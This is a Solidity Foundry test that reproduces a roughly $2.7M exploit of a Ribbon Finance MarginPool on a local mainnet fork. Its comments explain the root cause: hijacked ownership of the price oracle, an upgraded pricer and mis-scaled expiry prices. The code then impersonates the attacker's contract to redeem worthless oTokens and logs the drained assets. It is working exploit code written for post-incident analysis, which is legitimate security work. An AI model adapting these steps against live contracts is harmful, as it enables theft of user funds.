// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$2.7M
// Attacker : https://etherscan.io/address/0x657CDEfc7ef8b459b519dEFc8BED2A67d3cC1aAb
// Attack Contract : https://etherscan.io/address/0x4BFD5C65082171DF83fD0fBBe54aa74909529b2c
// Vulnerable Contract : https://etherscan.io/address/0x3c212A044760DE5a529B3Ba59363ddeCcc2210bE (MarginPool)
// Oracle : https://etherscan.io/address/0xb5711dAeC960c9487d95bA327c570a7cCE4982c0
// Attack Tx (setup prices) : https://etherscan.io/tx/0xb73e45948f4aabd77ca888710d3685dd01f1c81d24361d4ea0e4b4899d490e1e
// Attack Tx (redeem) : https://etherscan.io/tx/0x16eded2553e0793472a6283093738152de1dd0e2504836856fbcaf88cc4a2687

// @Analysis
// Twitter Guy : https://x.com/CertiKAlert/status/2000017101080379662
// Root cause : Temporary ownership of asset pricer proxies via ownership-registry
//              transferOwnership(proxy,newOwner) -> upgrade impl -> setExpiryPrice with
//              wrong-scale (x1e7) prices -> redeem OTM cash-secured call oTokens as ITM
//              against MarginPool collateral.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
}

interface IController {
    enum ActionType {
        OpenVault,
        MintShortOption,
        BurnShortOption,
        DepositLongOption,
        WithdrawLongOption,
        DepositCollateral,
        WithdrawCollateral,
        SettleVault,
        Redeem,
        Call,
        Liquidate
    }

    struct ActionArgs {
        ActionType actionType;
        address owner;
        address secondAddress;
        address asset;
        uint256 vaultId;
        uint256 amount;
        uint256 index;
        bytes data;
    }

    function operate(ActionArgs[] memory _actions) external;
}

contract RibbonMarginPool is BaseTestWithBalanceLog {
    address constant ATTACK_C = 0x4BFD5C65082171DF83fD0fBBe54aa74909529b2c;
    address constant CONTROLLER = 0x4bec71A4Ac41eE9761440F6921DD17bA1C1213B1;
    address constant MARGIN_POOL = 0x3c212A044760DE5a529B3Ba59363ddeCcc2210bE;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // oTokens (attack contract holds longs). Amounts match historical redeem burns.
    address constant O_STETH = 0x8eccaCbc1147fc7eDc52bae135bd54F5f1950255;
    address constant O_AAVE = 0x4403Dee117606fe19a0A6adfF6dB1bde5C0B2Cf1;
    address constant O_LINK = 0x9c7B06C2Ccd510812e9C7f63EAa4d7656E49bD4e;
    address constant O_PAXG = 0x8C2d0b5A5dfe9067B0e351B3302d272b6376A6e7;

    // After setup (prices corrupted); historical redeem at 23995264.
    uint256 constant BLOCK_AFTER_SETUP = 23995263;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", BLOCK_AFTER_SETUP);
        fundingToken = WETH;
    }

    function testExploit() public {
        uint256 wethBefore = IERC20Like(WETH).balanceOf(ATTACK_C);
        uint256 usdcBefore = IERC20Like(USDC).balanceOf(ATTACK_C);
        uint256 wstBefore = IERC20Like(WSTETH).balanceOf(ATTACK_C);
        uint256 wbtcBefore = IERC20Like(WBTC).balanceOf(ATTACK_C);
        uint256 poolWethBefore = IERC20Like(WETH).balanceOf(MARGIN_POOL);

        emit log_named_decimal_uint("Attacker WETH before", wethBefore, 18);
        emit log_named_decimal_uint("Attacker USDC before", usdcBefore, 6);
        emit log_named_decimal_uint("Attacker wstETH before", wstBefore, 18);
        emit log_named_decimal_uint("Attacker WBTC before", wbtcBefore, 8);
        emit log_named_decimal_uint("MarginPool WETH before", poolWethBefore, 18);

        // Historical burn sizes from attack tx (pool cannot cover full oToken supply at inflated prices).
        IController.ActionArgs[] memory actions = new IController.ActionArgs[](4);
        actions[0] = _redeem(O_STETH, 2999);
        actions[1] = _redeem(O_AAVE, 66801);
        actions[2] = _redeem(O_LINK, 126623);
        actions[3] = _redeem(O_PAXG, 550);

        vm.prank(ATTACK_C);
        IController(CONTROLLER).operate(actions);

        uint256 wethAfter = IERC20Like(WETH).balanceOf(ATTACK_C);
        uint256 usdcAfter = IERC20Like(USDC).balanceOf(ATTACK_C);
        uint256 wstAfter = IERC20Like(WSTETH).balanceOf(ATTACK_C);
        uint256 wbtcAfter = IERC20Like(WBTC).balanceOf(ATTACK_C);
        uint256 poolWethAfter = IERC20Like(WETH).balanceOf(MARGIN_POOL);

        emit log_named_decimal_uint("Attacker WETH after", wethAfter, 18);
        emit log_named_decimal_uint("Attacker USDC after", usdcAfter, 6);
        emit log_named_decimal_uint("Attacker wstETH after", wstAfter, 18);
        emit log_named_decimal_uint("Attacker WBTC after", wbtcAfter, 8);
        emit log_named_decimal_uint("WETH gained", wethAfter - wethBefore, 18);
        emit log_named_decimal_uint("USDC gained", usdcAfter - usdcBefore, 6);
        emit log_named_decimal_uint("wstETH gained", wstAfter - wstBefore, 18);
        emit log_named_decimal_uint("WBTC gained", wbtcAfter - wbtcBefore, 8);
        emit log_named_decimal_uint("MarginPool WETH drained", poolWethBefore - poolWethAfter, 18);

        require(
            (wethAfter > wethBefore) || (usdcAfter > usdcBefore) || (wstAfter > wstBefore) || (wbtcAfter > wbtcBefore),
            "no profit"
        );
    }

    function _redeem(address otoken, uint256 amount) internal pure returns (IController.ActionArgs memory a) {
        a = IController.ActionArgs({
            actionType: IController.ActionType.Redeem,
            owner: address(0),
            secondAddress: ATTACK_C,
            asset: otoken,
            vaultId: 0,
            amount: amount,
            index: 0,
            data: ""
        });
    }
}
